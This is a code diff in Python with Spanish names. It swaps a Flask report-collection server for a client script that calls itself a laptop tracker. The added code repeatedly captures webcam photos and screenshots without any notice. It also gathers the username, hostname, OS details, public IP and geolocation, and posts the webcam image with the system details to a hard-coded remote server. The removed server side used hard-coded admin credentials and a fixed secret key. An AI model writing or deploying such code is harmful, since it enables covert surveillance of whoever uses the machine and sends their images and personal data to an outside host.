@@ -1,94 +1,106 @@
-from flask import Flask, request, render_template, redirect, url_for, session, send_from_directory
-from datetime import datetime
 import os
-import json
+import cv2
 import time
+import json
+import socket
+import psutil
+import pyautogui
+import getpass
+import platform
+import requests
+import threading
+from datetime import datetime
 
-app = Flask(__name__)
-app.secret_key = 'clave-super-secreta'
-UPLOAD_FOLDER = 'static/uploads'
+SERVER_URL = "https://laptop-tracker-server.onrender.com/report"
+INTERVALO_MINUTOS = 15
 
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+def capturar_webcam():
+    try:
+        cam = cv2.VideoCapture(0)
+        result, image = cam.read()
+        cam.release()
+        if result:
+            filename = "webcam.jpg"
+            cv2.imwrite(filename, image)
+            return filename
+    except Exception as e:
+        print(f"[!] Error al capturar webcam: {e}")
+    return None
 
-if not os.path.exists("reportes.json"):
-    with open("reportes.json", "w") as f:
-        json.dump([], f)
+def capturar_pantalla():
+    try:
+        screenshot = pyautogui.screenshot()
+        filename = "screenshot.jpg"
+        screenshot.save(filename)
+        return filename
+    except Exception as e:
+        print(f"[!] Error al capturar pantalla: {e}")
+    return None
 
-@app.route('/report', methods=['POST'])
-def report():
-    ip = request.form.get('ip')
-    username = request.form.get('username')
-    system_info = request.form.get('system_info')
-    image = request.files.get('image')
+def obtener_ip_publica():
+    try:
+        return requests.get("https://api.ipify.org").text
+    except:
+        return "Desconocida"
 
-    print("\n📥 NUEVO REPORTE RECIBIDO")
-    print("IP:", ip)
-    print("Usuario:", username)
-    print("Sistema:", system_info)
-    print("Imagen recibida:", "Sí" if image else "No")
+def obtener_geolocalizacion(ip):
+    try:
+        res = requests.get(f"https://ipinfo.io/{ip}/json")
+        data = res.json()
+        return {
+            "ciudad": data.get("city"),
+            "region": data.get("region"),
+            "pais": data.get("country"),
+            "loc": data.get("loc")
+        }
+    except:
+        return {}
 
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-
-    image_filename = None
-    if image:
-        image_filename = f"{int(time.time())}.jpg"
-        image_path = os.path.join(UPLOAD_FOLDER, image_filename)
-        image.save(image_path)
-
-    report_data = {
-        "ip": ip,
-        "username": username,
-        "system_info": system_info,
-        "timestamp": timestamp,
-        "image": image_filename
+def recolectar_info():
+    ip_publica = obtener_ip_publica()
+    info = {
+        "ip_publica": ip_publica,
+        "usuario": getpass.getuser(),
+        "sistema": f"{platform.system()} {platform.release()}",
+        "version": platform.version(),
+        "nombre_equipo": socket.gethostname(),
+        "hora": str(datetime.now())
     }
+    info.update(obtener_geolocalizacion(ip_publica))
+    return info
 
-    with open("reportes.json", "r") as f:
-        data = json.load(f)
+def enviar_al_servidor(info, archivos):
+    try:
+        with open(archivos["webcam"], "rb") as img:
+            files = {
+                "image": img
+            }
+            data = {
+                "ip": info["ip_publica"],
+                "username": info["usuario"],
+                "system_info": f"{info['sistema']} ({info['version']})"
+            }
+            response = requests.post(SERVER_URL, files=files, data=data)
+            print("[+] Enviado al servidor:", response.status_code)
+            print("[*] Respuesta del servidor:", response.text)
+    except Exception as e:
+        print(f"[!] Error enviando datos: {e}")
 
-    data.insert(0, report_data)
-
-    with open("reportes.json", "w") as f:
-        json.dump(data, f, indent=2)
-
-    return "Reporte recibido", 200
-
-@app.route("/")
-def home():
-    if not session.get("logged_in"):
-        return redirect(url_for("login"))
-    with open("reportes.json", "r") as f:
-        data = json.load(f)
-    reports = []
-    for i, r in enumerate(data, 1):
-        reports.append([
-            i,
-            r.get("ip", "None"),
-            r.get("username", "None"),
-            r.get("system_info", "None"),
-            r.get("timestamp", "None"),
-            r.get("image", None)
-        ])
-    return render_template("panel.html", reports=reports)
-
-@app.route("/uploads/<filename>")
-def uploaded_file(filename):
-    return send_from_directory(UPLOAD_FOLDER, filename)
-
-@app.route("/login", methods=["GET", "POST"])
-def login():
-    if request.method == "POST":
-        if request.form["username"] == "admin" and request.form["password"] == "admin123":
-            session["logged_in"] = True
-            return redirect(url_for("home"))
-        return "Credenciales incorrectas", 403
-    return render_template("login.html")
-
-@app.route("/logout")
-def logout():
-    session.clear()
-    return redirect(url_for("login"))
+def ejecutar_rastreador():
+    while True:
+        print("[*] Recolectando información...")
+        info = recolectar_info()
+        archivos = {
+            "webcam": capturar_webcam(),
+            "pantalla": capturar_pantalla()
+        }
+        if archivos["webcam"]:
+            enviar_al_servidor(info, archivos)
+        else:
+            print("[!] No se capturó imagen correctamente.")
+        print(f"[⏱] Esperando {INTERVALO_MINUTOS} minutos...\n")
+        time.sleep(INTERVALO_MINUTOS * 60)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=10000)
+    t = threading.Thread(target=ejecutar_rastreador)
+    t.start()
